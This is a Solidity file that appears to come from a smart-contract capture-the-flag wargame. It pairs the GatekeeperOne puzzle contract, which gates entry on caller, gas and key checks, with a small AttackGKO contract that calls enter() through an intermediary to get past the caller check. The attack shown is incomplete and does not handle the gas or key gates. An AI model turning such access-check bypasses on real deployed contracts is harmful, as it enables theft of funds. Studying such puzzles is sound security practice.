pragma solidity ^0.4.18;

contract GatekeeperOne {

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(msg.gas % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(_gateKey) == uint16(_gateKey));
        require(uint32(_gateKey) != uint64(_gateKey));
        require(uint32(_gateKey) == uint16(tx.origin));
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {}
}

contract AttackGKO {
    function attack(bytes8 _gateKey, address target) public returns (bool) {
        GatekeeperOne f = GatekeeperOne(target);
        f.enter(_gateKey);
    }
}
